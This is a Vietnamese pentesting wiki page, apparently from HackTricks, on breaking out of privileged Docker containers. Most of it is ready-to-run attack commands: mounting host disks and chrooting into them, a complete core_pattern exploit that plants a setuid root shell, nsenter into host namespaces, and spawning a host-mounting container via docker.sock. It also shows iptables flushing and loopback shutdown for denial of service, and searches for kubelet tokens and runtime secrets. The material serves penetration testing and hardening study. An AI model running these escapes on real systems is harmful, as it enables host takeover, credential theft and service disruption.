# Thoát khỏi Container `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Tổng quan

Container được khởi chạy với `--privileged` không giống container thông thường chỉ có thêm một hoặc hai quyền. Trên thực tế, `--privileged` loại bỏ hoặc làm suy yếu một số biện pháp bảo vệ mặc định của runtime vốn thường ngăn workload truy cập các tài nguyên nguy hiểm của host. Tác động chính xác vẫn phụ thuộc vào runtime và host, nhưng với Docker, kết quả thường là:

- tất cả capabilities đều được cấp
- các giới hạn của device cgroup được gỡ bỏ
- nhiều filesystem của kernel không còn được mount ở chế độ chỉ đọc
- các đường dẫn procfs bị mask theo mặc định không còn bị mask
- bộ lọc seccomp bị vô hiệu hóa
- cơ chế cô lập AppArmor bị vô hiệu hóa
- cơ chế cô lập SELinux bị vô hiệu hóa hoặc được thay bằng một nhãn rộng hơn nhiều

Hệ quả quan trọng là container privileged thường **không** cần đến một kernel exploit tinh vi. Trong nhiều trường hợp, nó có thể tương tác trực tiếp với thiết bị của host, các filesystem hướng đến host của kernel hoặc các giao diện runtime, rồi chuyển sang một shell trên host.

## Những gì `--privileged` Không Tự Động Thay Đổi

`--privileged` **không** tự động tham gia các namespace PID, network, IPC hoặc UTS của host. Container privileged vẫn có thể sử dụng các namespace riêng. Điều đó có nghĩa là một số chuỗi thoát cần thêm điều kiện như:

- bind mount từ host
- chia sẻ PID với host
- sử dụng network của host
- nhìn thấy các thiết bị của host
- các giao diện proc/sys có quyền ghi

Những điều kiện này thường dễ đáp ứng trong các cấu hình sai ngoài thực tế, nhưng về mặt khái niệm, chúng tách biệt với bản thân `--privileged`.

## Các cách thoát

### 1. Mount Ổ đĩa của Host Thông qua Thiết bị Được Phơi Bày

Container privileged thường nhìn thấy nhiều node thiết bị hơn trong `/dev`. Nếu thiết bị block của host hiển thị, cách thoát đơn giản nhất là mount thiết bị đó rồi `chroot` vào filesystem của host:

```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```

Nếu phân vùng root không rõ ràng, trước tiên hãy liệt kê bố cục thiết bị khối:

```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```

Nếu cách làm thực tế là đặt một helper setuid trong mount trên host có quyền ghi thay vì dùng `chroot`, hãy nhớ rằng không phải filesystem nào cũng tôn trọng bit setuid. Có thể nhanh chóng kiểm tra capability từ phía host bằng cách:

```bash
mount | grep -v "nosuid"
```

Điều này hữu ích vì các đường dẫn có quyền ghi trên hệ thống tệp `nosuid` kém hấp dẫn hơn nhiều đối với các quy trình cổ điển kiểu “thả một shell setuid rồi thực thi sau”.

Các biện pháp bảo vệ bị suy yếu và bị lợi dụng ở đây là:

- phơi lộ toàn bộ thiết bị
- các capability rộng, đặc biệt là `CAP_SYS_ADMIN`

Các trang liên quan:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Mount Hoặc Tái Sử Dụng Bind Mount Của Host Và `chroot`

Nếu hệ thống tệp root của host đã được mount bên trong container, hoặc nếu container có thể tạo các mount cần thiết vì nó có đặc quyền, thì thường chỉ cần `chroot` là có thể truy cập shell của host:

```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Nếu không có bind mount root của host nhưng có thể truy cập bộ nhớ lưu trữ của host, hãy tạo một cái:

```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```

Đường tấn công này lợi dụng:

- các hạn chế mount bị nới lỏng
- đầy đủ capabilities
- thiếu cơ chế cô lập MAC

Các trang liên quan:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Lạm dụng `/proc/sys` Hoặc `/sys` Có Thể Ghi

Một trong những hệ quả lớn của `--privileged` là các biện pháp bảo vệ procfs và sysfs trở nên yếu hơn nhiều. Điều này có thể làm lộ các giao diện kernel hướng đến host vốn thường bị che hoặc được mount ở chế độ chỉ đọc.

Một ví dụ kinh điển là `core_pattern`:<sup>[[1]](#references)</sup>

```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
  char buf[1];
  for (int i = 0; i < 100; i++) buf[i] = 1;
  return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```

Các đường dẫn có giá trị cao khác bao gồm:

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Đường dẫn này khai thác:

- các đường dẫn bị thiếu trong danh sách masked
- các đường dẫn hệ thống chỉ đọc bị thiếu

Các trang liên quan:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Sử dụng đầy đủ capabilities để thoát dựa trên mount hoặc namespace

Một container privileged có các capabilities thường bị loại bỏ khỏi container tiêu chuẩn, bao gồm `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` và nhiều capability khác. Điều này thường đủ để biến một foothold cục bộ thành một lối thoát sang host ngay khi có thêm một bề mặt khác bị lộ.

Một ví dụ đơn giản là mount thêm filesystem và sử dụng namespace entry:

```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```

Nếu PID của host cũng được chia sẻ, bước này còn ngắn hơn nữa:

```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```

Đường dẫn này lạm dụng:

- bộ capability mặc định có quyền cao
- tùy chọn chia sẻ PID của host

Các trang liên quan:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Thoát qua các socket của runtime

Container có quyền cao thường để lộ trạng thái hoặc socket của runtime trên host. Nếu có thể truy cập socket Docker, containerd hoặc CRI-O, cách đơn giản nhất thường là dùng API của runtime để khởi chạy container thứ hai có quyền truy cập host:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Đối với containerd:

```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```

Đường khai thác này lợi dụng:

- việc runtime có quyền đặc quyền bị lộ
- các bind mount vào host được tạo thông qua chính runtime

Các trang liên quan:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Loại bỏ các tác động phụ của việc cô lập mạng

`--privileged` tự nó không tham gia network namespace của host, nhưng nếu container cũng có `--network=host` hoặc quyền truy cập mạng khác tới host, toàn bộ network stack có thể bị thay đổi:

```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```

Đây không phải lúc nào cũng là shell trực tiếp trên host, nhưng có thể gây denial of service, chặn bắt lưu lượng hoặc truy cập các dịch vụ quản lý chỉ khả dụng qua loopback.

Các trang liên quan:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Đọc bí mật trên host và trạng thái runtime

Ngay cả khi chưa thể thoát shell ngay lập tức, các container privileged thường có đủ quyền truy cập để đọc bí mật trên host, trạng thái kubelet, metadata runtime và hệ thống tệp của các container lân cận:

```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```

Nếu `/var` được mount từ host hoặc các thư mục runtime có thể truy cập được, điều này có thể đủ để thực hiện lateral movement hoặc đánh cắp thông tin xác thực cloud/Kubernetes ngay cả trước khi có được shell trên host.

Các trang liên quan:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Checks

Mục đích của các lệnh sau là xác nhận những nhóm kỹ thuật thoát khỏi privileged container nào có thể thực hiện ngay.

```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```

Điều gì đáng chú ý ở đây:

- bộ capability đầy đủ, đặc biệt là `CAP_SYS_ADMIN`
- proc/sys có thể ghi
- nhìn thấy các thiết bị của host
- thiếu cơ chế confinement của seccomp và MAC
- socket runtime hoặc bind mount thư mục root của host

Bất kỳ yếu tố nào trong số này cũng có thể đủ để thực hiện post-exploitation. Khi có nhiều yếu tố cùng lúc, thường chỉ cần một hoặc hai lệnh nữa là container có thể xâm phạm host.

## Trang liên quan

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## References

- [1] [Thoát khỏi privileged container cho vui](https://pwning.systems/posts/escaping-containers-for-fun/)
{{#include ../../../banners/hacktricks-training.md}}
